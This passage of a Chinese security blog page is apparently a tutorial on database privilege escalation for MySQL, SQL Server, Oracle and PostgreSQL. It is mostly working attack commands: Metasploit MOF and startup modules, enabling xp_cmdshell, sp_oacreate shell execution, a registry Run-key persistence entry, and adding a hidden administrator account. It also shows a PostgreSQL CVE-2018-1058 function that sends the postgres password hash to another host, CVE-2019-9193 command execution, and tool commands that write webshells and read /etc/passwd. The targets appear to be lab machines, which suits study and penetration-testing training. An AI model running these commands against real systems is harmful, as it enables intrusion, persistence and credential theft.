+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/11.png"
+	width="1100"
+	height="645"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/11_hu_dd77ed65dc583c03.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/11_hu_4c564f2bd5286566.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="409px"
+	
+></p>
+<h3 id="mof提权">MOF提权
+</h3><p><strong>现在通过mof文件来进行提权已经非常困难了，因为它支持提权版本只有2003和一些之前的版本。mof的提权原理为mof文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_mof</span>    <span class="o">//</span><span class="n">使用MSF自带的mof提权模块</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="mysql启动项提权">mysql启动项提权
+</h3><p><strong>就是写一个木马到Windows启动项目录下，需要配合服务器重启才能成功，前提需要开启root用户外联</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_start_up</span>   <span class="o">//</span><span class="n">使用MSF自带的mof提权模块</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">rhost</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">password</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="sqlserver提权">SqlServer提权
+</h2><p><a class="link" href="https://blog.csdn.net/zhzx123aa/article/details/146362888"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/zhzx123aa/article/details/146362888</a></p>
+<p><a class="link" href="https://www.cnblogs.com/suv789/p/18700276"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/suv789/p/18700276</a></p>
+<p><a class="link" href="https://www.cnblogs.com/hellobao/articles/17249842.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/hellobao/articles/17249842.html</a></p>
+<h3 id="xp_cmdshell提权">XP_cmdshell提权
+</h3><p><strong>原理：xp_cmdshell可以让系统管理员以操作cmd的方式执行给定的命令，并以文本方式返回输出，是一个功能非常强大的扩展存储过程。xp_cmdshell在SQLserver2000中默认开启，可以直接执行系统命令。2005本身及之后的版本默认禁止，所以想要使用，就需要拥有SA账号相应权限，使用sp_configure将其开启。</strong></p>
+<p><strong>利用条件：</strong></p>
+<ol>
+<li><strong>拿到sqlserver数据库sa权限</strong></li>
+<li><strong>sqlserver服务未降权</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">xp_cmdshell在sqlserver高版本中是默认禁用的</span><span class="err">，</span><span class="n">下面是开启命令</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">RECONFIGURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">RECONFIGURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">xp_cmdshell</span> <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>          <span class="o">//</span><span class="n">利用xp_cmdshell执行系统命令</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="sp_oacreate提权">sp_oacreate提权
+</h3><p><code>sp_oacreate</code><strong>用于创建OLE自动化对象实例，搭配</strong><code>sp_oamethod</code><strong>可以调用系统组件（如</strong><code>WScript.Shell</code><strong>）执行命令。</strong></p>
+<p><strong>使用前提</strong>：需要SA权限，默认情况下此功能可用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DECLARE</span> <span class="nd">@shell</span> <span class="n">INT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">sp_oacreate</span> <span class="s1">&#39;WScript.Shell&#39;</span><span class="p">,</span> <span class="nd">@shell</span> <span class="n">OUTPUT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">sp_oamethod</span> <span class="nd">@shell</span><span class="p">,</span> <span class="s1">&#39;Run&#39;</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="s1">&#39;cmd.exe /c whoami &gt; C:</span><span class="se">\r</span><span class="s1">esult.txt&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">sp_oadestroy</span> <span class="nd">@shell</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="沙盒提权xp_regwrite">沙盒提权xp_regwrite
+</h3><ul>
+<li><strong>功能</strong>：<code>xp_regwrite</code>允许修改Windows注册表。</li>
+<li><strong>提权用途</strong>：通过更改注册表，攻击者可以启用禁用功能、添加启动项或修改系统配置以实现提权。</li>
+<li><strong>使用前提</strong>：需要SA权限。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">xp_regwrite</span> <span class="nd">@rootkey</span><span class="o">=</span><span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="p">,</span> <span class="nd">@key</span><span class="o">=</span><span class="s1">&#39;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#39;</span><span class="p">,</span> <span class="nd">@value_name</span><span class="o">=</span><span class="s1">&#39;Test&#39;</span><span class="p">,</span> <span class="nd">@type</span><span class="o">=</span><span class="s1">&#39;REG_SZ&#39;</span><span class="p">,</span> <span class="nd">@value</span><span class="o">=</span><span class="s1">&#39;C:\malicious.exe&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">EXEC</span> <span class="n">master</span><span class="o">.</span><span class="n">dbo</span><span class="o">.</span><span class="n">xp_regwrite</span> <span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="p">,</span><span class="s1">&#39;SoftWare\Microsoft\Jet</span><span class="se">\4</span><span class="s1">.0\Engines&#39;</span><span class="p">,</span><span class="s1">&#39;SandBoxMode&#39;</span><span class="p">,</span><span class="s1">&#39;REG_DWORD&#39;</span><span class="p">,</span><span class="mi">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>然后利用sql语句添加一个帐号和密码都为sql$的帐号，同时加入管理员组进行提权：</strong></p>
+<p><strong>创建账户+添加到管理员组：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Select</span> <span class="o">*</span> <span class="n">From</span> <span class="n">OpenRowSet</span><span class="p">(</span><span class="s1">&#39;Microsoft.Jet.OLEDB.4.0&#39;</span><span class="p">,</span><span class="s1">&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;</span><span class="p">,</span><span class="s1">&#39;select shell(&#34;net user sql$ 123 /add&#34;)&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Select</span> <span class="o">*</span> <span class="n">From</span> <span class="n">OpenRowSet</span><span class="p">(</span><span class="s1">&#39;Microsoft.Jet.OLEDB.4.0&#39;</span><span class="p">,</span><span class="s1">&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;</span><span class="p">,</span><span class="s1">&#39;select shell(&#34;net localgroup administrators sql$ /add&#34;)&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="oracle数据库提权">Oracle数据库提权
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/yOe9VtbV4Hw4NZyj95YPDA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/yOe9VtbV4Hw4NZyj95YPDA</a></p>
+<p><a class="link" href="https://www.shuzhiduo.com/A/pRdBPVMaJn/"  target="_blank" rel="noopener"
+    >https://www.shuzhiduo.com/A/pRdBPVMaJn/</a></p>
+<p><strong>Oracle数据库有3种提权模式，普通模式/DBA模式/注入模式，可以直接使用脚本一把梭</strong></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/12.png"
+	width="1363"
+	height="979"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/12_hu_f24c387dbb2bac24.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/12_hu_3106f43e33f00ee9.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="334px"
+	
+></p>
+<h2 id="postgresql数据库提权">PostgreSQL数据库提权
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/6wPc5eJACcmhVZ-yFMxrYA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/6wPc5eJACcmhVZ-yFMxrYA</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;PostgreSQL&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="cve-2018-1058">CVE-2018-1058
+</h3><p><strong>PostgreSQL 是一个功能强大的开源关系型数据库系统。在9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下可能执行普通用户创建的恶意代码，从而造成意外的操作。</strong></p>
+<p><strong>Navicat连接数据库</strong><code>vulhub:vulhub</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">CREATE</span> <span class="n">FUNCTION</span> <span class="n">public</span><span class="o">.</span><span class="n">array_to_string</span><span class="p">(</span><span class="n">anyarray</span><span class="p">,</span><span class="n">text</span><span class="p">)</span> <span class="n">RETURNS</span> <span class="n">TEXT</span> <span class="n">AS</span> <span class="err">$$</span>
+</span></span><span class="line"><span class="cl">    <span class="n">select</span> <span class="n">dblink_connect</span><span class="p">((</span><span class="n">select</span> <span class="s1">&#39;hostaddr=192.168.139.41 port=5433 user=postgres password=chybeta sslmode=disable dbname=&#39;</span><span class="o">||</span><span class="p">(</span><span class="n">SELECT</span> <span class="n">passwd</span> <span class="n">FROM</span> <span class="n">pg_shadow</span> <span class="n">WHERE</span> <span class="n">usename</span><span class="o">=</span><span class="s1">&#39;postgres&#39;</span><span class="p">)));</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">SELECT</span> <span class="n">pg_catalog</span><span class="o">.</span><span class="n">array_to_string</span><span class="p">(</span><span class="err">$</span><span class="mi">1</span><span class="p">,</span><span class="err">$</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">$$</span> <span class="n">LANGUAGE</span> <span class="n">SQL</span> <span class="n">VOLATILE</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/13.png"
+	width="1823"
+	height="863"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/13_hu_f4982da01dc3d117.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/13_hu_dc4d994db923be61.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
+></p>
+<p><strong>在靶机中执行</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">docker</span><span class="o">-</span><span class="n">compose</span> <span class="n">exec</span> <span class="n">postgres</span> <span class="n">pg_dump</span> <span class="o">-</span><span class="n">U</span> <span class="n">postgres</span> <span class="o">-</span><span class="n">f</span> <span class="n">evil</span><span class="o">.</span><span class="n">bak</span> <span class="n">vulhub</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">即可导出vulhub用户的hash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="cve-2019-9193">CVE-2019-9193
+</h3><p><strong>影响版本：PostgreSQL v9.3-v11</strong></p>
+<p><strong>使用</strong><code>postgres:postgres</code><strong>默认密码连接数据库</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">执行以下命令</span>
+</span></span><span class="line"><span class="cl"><span class="n">DROP</span> <span class="n">TABLE</span> <span class="n">IF</span> <span class="n">EXISTS</span> <span class="n">cmd_exec</span><span class="p">;</span><span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span> <span class="n">text</span><span class="p">);</span><span class="n">COPY</span> <span class="n">cmd_exec</span> <span class="n">FROM</span> <span class="n">PROGRAM</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span><span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">cmd_exec</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/14.png"
+	width="1629"
+	height="854"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/14_hu_4ba765f943fa1d97.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/14_hu_b950abd0a9de2440.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<h2 id="数据库利用工具">数据库利用工具
+</h2><h3 id="mdut">MDUT
+</h3><p>下载地址：https://github.com/SafeGroceryStore/MDUT</p>
+<p>使用指南：<a class="link" href="https://www.yuque.com/u21224612/nezuig/xs8c0f"  target="_blank" rel="noopener"
+    >MDUT</a></p>
+<h4 id="mysql-udf提权">Mysql UDF提权
+</h4><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/15.png"
+	width="1491"
+	height="1168"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/15_hu_b201902e492c9ea6.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/15_hu_c4f6913b2500c85f.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="127"
+		data-flex-basis="306px"
+	
+></p>
+<h4 id="postgresql只支持cve-2019-9193提权">PostgreSQL只支持CVE-2019-9193提权
+</h4><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/16.png"
+	width="1200"
+	height="986"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/16_hu_4e883d58aa9bba5d.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/16_hu_6eb0f589813226b0.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="292px"
+	
+></p>
+<h3 id="oracleshelloracle数据库命令执行工具">OracleShell&mdash;Oracle数据库命令执行工具
+</h3><p><strong>下载地址：</strong><a class="link" href="https://github.com/jas502n/oracleShell"  target="_blank" rel="noopener"
+    ><strong>https://github.com/jas502n/oracleShell</strong></a></p>
+<p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/17.png"
+	width="1356"
+	height="977"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/17_hu_d7130023f7f8d4d0.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/17_hu_137a4bc4e0c1831f.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="333px"
+	
+></p>
+<h3 id="databasetools"><strong>DatabaseTools</strong>
+</h3><p><strong>下载地址：</strong><a class="link" href="https://github.com/Hel10-Web/Databasetools"  target="_blank" rel="noopener"
+    ><strong>https://github.com/Hel10-Web/Databasetools</strong></a></p>
+<h4 id="mysql"><strong>Mysql</strong>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">h</span>          <span class="o">//</span><span class="n">命令行工具</span><span class="err">，</span><span class="n">不是图形化工具</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">获取SQL</span> <span class="n">Shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">mysql</span> <span class="o">-</span><span class="n">ruser</span> <span class="n">root</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.139.148</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;root&#34;</span> <span class="o">-</span><span class="n">rport</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">cli</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/18.png"
+	width="2534"
+	height="501"
+	srcset="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/18_hu_e56866d53d606050.png 480w, /p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/18_hu_e91bb44a14a39936.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="505"
+		data-flex-basis="1213px"
+	
+></p>
+<h5 id="into-out-file获取webshell">into out file获取webshell
+</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">mysql</span> <span class="o">-</span><span class="n">ruser</span> <span class="n">root</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.139.148</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;root&#34;</span> <span class="o">-</span><span class="n">rport</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">shell</span> <span class="o">-</span><span class="n">outfileshell</span> <span class="o">-</span><span class="n">path</span> <span class="s2">&#34;C:</span><span class="se">\\\\</span><span class="s2">phpStudy</span><span class="se">\\\\</span><span class="s2">WWW</span><span class="se">\\\\\a</span><span class="s2">aa.php&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="全局日志getshell">全局日志getshell
+</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">mysql</span> <span class="o">-</span><span class="n">ruser</span> <span class="n">root</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.139.148</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;root&#34;</span> <span class="o">-</span><span class="n">rport</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">shell</span> <span class="o">-</span><span class="n">generallog</span> <span class="o">-</span><span class="n">path</span> <span class="n">C</span><span class="p">:</span>\\\\<span class="n">phpStudy</span>\\\\<span class="n">WWW</span>\\\\<span class="n">aam</span><span class="o">.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="udf提权">udf提权
+</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">mysql</span> <span class="o">-</span><span class="n">ruser</span> <span class="n">root</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.139.148</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;root&#34;</span> <span class="o">-</span><span class="n">rport</span> <span class="mi">3306</span> <span class="o">-</span><span class="n">udf</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="postgresql">PostgreSQL
+</h4><h5 id="连接postgre数据库获取sql-shell">连接postgre数据库获取sql shell
+</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">postgre</span> <span class="o">-</span><span class="n">ruser</span>  <span class="s2">&#34;postgres&#34;</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;postgres&#34;</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.111.162</span> <span class="o">-</span><span class="n">rport</span> <span class="s2">&#34;5432&#34;</span> <span class="o">-</span><span class="n">cli</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="利用cve-2019-9193循环执行命令">利用CVE-2019-9193循环执行命令
+</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">postgre</span> <span class="o">-</span><span class="n">ruser</span>  <span class="s2">&#34;postgres&#34;</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;postgres&#34;</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.111.139</span> <span class="o">-</span><span class="n">rport</span> <span class="s2">&#34;5432&#34;</span> <span class="o">-</span><span class="n">CVE20199193</span> <span class="o">-</span><span class="n">console</span>
+</span></span><span class="line"><span class="cl"><span class="n">读取文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">DatabaseTools_windows_amd64</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">postgre</span> <span class="o">-</span><span class="n">ruser</span>  <span class="s2">&#34;postgres&#34;</span> <span class="o">-</span><span class="n">pwd</span> <span class="s2">&#34;postgres&#34;</span> <span class="o">-</span><span class="n">rhost</span> <span class="mf">192.168.111.139</span> <span class="o">-</span><span class="n">rport</span> <span class="s2">&#34;5432&#34;</span> <span class="o">-</span><span class="n">read1</span> <span class="o">-</span><span class="n">file</span> <span class="s2">&#34;/etc/passwd&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>&hellip;其它利用命令可以去项目地址查看</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jun 15, 2025 13:53 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/mysql%E6%94%BB%E9%98%B2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql%E6%94%BB%E9%98%B2/mysql.246bc6d4830b0355063ccd9f855bc31f_hu_1a9eb8d0c8cc018c.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Mysql攻防"
+                        
+                        data-hash="md5-JGvG1IMLA1UGPM2fhVvDHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mysql攻防</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ssrf/ssrf.82f4b7d8f1ed0a0c59082752f949fe0c_hu_b02e966e9b7304c4.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post SSRF"
+                        
+                        data-hash="md5-gvS32PHtCgxZCCdS&#43;Un&#43;DA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSRF</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/cors/">
+        
+        
+            <div class="article-image">
